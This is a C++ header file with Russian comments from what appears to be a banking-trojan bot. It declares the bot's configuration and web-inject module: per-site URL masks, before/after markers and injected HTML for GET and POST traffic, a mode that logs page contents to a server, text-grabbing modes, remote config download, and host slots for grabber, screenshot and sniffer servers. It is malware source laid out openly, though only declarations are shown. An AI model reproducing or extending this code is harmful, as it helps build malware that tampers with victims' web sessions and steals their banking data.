// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// В дальнейшем планируется разделение инжектов от конфига, нро в
// данный момент включение/отключение HTKL инжектов оставляем в этом модуле
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"

// флаг L, грабит кусок текста
//#define MODE_GETTEXT_GET  1   //LG
//#define MODE_GETTEXT_POST 2   //LP
//#define MODE_GETTEXT_ALL  3   //GPL или L

// без флага, замена текста
//#define MODE_SETTEXT_GET  4  //G
//#define MODE_SETTEXT_POST 5  //P
//#define MODE_SETTEXT_ALL  6  //GP

#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5

//#define PAGE_READED_FLAG 0x01
//#define PAGE_IS_INJECT   0x05

//#define INJECT_STATE_NONE	 0x01
//#define INJECT_STATE_ALREADY 0x02

#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  Методы для работы с конфигурационным файлом бота
//
//
//  ВАЖНО!!!!!! Некоторые опции конфига доступны только для визуальных
//              приложений
//				добавить имя BV_APP в имена препроцесора
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
	bool Disabled;     // Не использовать инжект (Для отладочной программы)
	LPVOID Owner;      // Указатель на инжект владелец данных

}*PHTMLInjectData;


//---------------------------------------------------------
//  THTMLInject - описание данных для внедрения своего
//                    HTML кода в загружаемые страницы
//---------------------------------------------------------
typedef struct THTMLInject
{
	PCHAR URL;       // Маска сайта для которого необходимо обрабатывать страницы
	bool GET; 		 // Обрабатывать GET запросы
	bool POST;       // Обрабатывать POST запросы
	bool IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
	PList Injects;   // Список инжектов (список элементов типа PHTMLInject)
	bool Disabled;   // Не использовать инжект (Для отладочной программы)
	bool Used;       // Признак того что маска использовалась
	#ifdef BV_APP
		PCHAR Comment;   // Коментарий к инжекту, только для редактора
	#endif
} *PHTMLInject;


//---------------------------------------------------------
// TBotConfig -  Настройки работы бота
//---------------------------------------------------------
typedef struct TBotConfig
{
	PList HTMLInjects; // Список инжектов (список элементов типа PHTMLInject)
	PRTL_CRITICAL_SECTION Lock;
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - установить метод обработки
//		событий HTML инжекта
//*********************************************************
// Метод, событие HTML инжекта
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
									LPVOID Sender, 	    	// источник события
									THTMLInjectEventID ID,  // Идентификатор события
									LPVOID Reserver);      	// Зарезервировано

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	//*********************************************************
	//	Initialize - Инициализировать глобальные
	//  	настройки бота. Если указао имя файла FileName то
	//  	настройки будут прочитаны из него, в противном
	//  	случае настройки будут прочитаны из файла вшитого
	//		в код бота.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// Функция возвращает указатель на конфиг бота
	PBotConfig GetConfig();

	// Очистить конфиг
	void Clear(PBotConfig Config);

	//  Функция возврашает имя файла по умолчанию
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  Функция устанавливает имя файла по умолчанию
	void SetFileName(PWCHAR FileName);

	// Загрузить конфиг
	bool Download(PCHAR URL);

	// Функция возвращает истину если буфер является конфигом
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - Получить инжекты для запроса
	bool GetInjectsForRequest(PRequest Request);
}


//****************************************************************************
//	HTMLInjects - Методы для работы с HTML инжектами
//****************************************************************************
namespace HTMLInjects
{
	//*********************************************************
	// Функция возвращает истину если данные можно использовать
	// в инжектах
	//*********************************************************
	bool IsValidInjectData(PHTMLInjectData Data);


	//*********************************************************
	//  Выполнить HTML инжекты.
	//
	//  Результат - функция возвращает истину если в буффер
	//              запроса были внесены изменения
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  AddInject - Добавить новый HTML инжект в список
	//		List. Если указан источник Source то в новый
	//		будут скопированы все его данные
	//*********************************************************
	PHTMLInject AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);

	//*********************************************************
	//  AddInjectData - Добавить новые данные инжекта
	//                      Добавлять данные инжекта, только
	//						этой функцией
	//*********************************************************
	PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);

	//*********************************************************
	//  ResetStatus - сбросить статус инжектов
	//*********************************************************
	void ResetStatus(PList Injects);

	//*********************************************************
	//  ClearInjectList - Функция рчищает список содержащий
	//		 			  элементы типа THTMLInject
	//*********************************************************
	void ClearInjectList(PList List);

	//*********************************************************
	//  Методы уничтожения данных HTML инжекта
	//*********************************************************
	void FreeInject(PHTMLInject Inject);

}

// -----------------------------------------------------------------------------
#endif
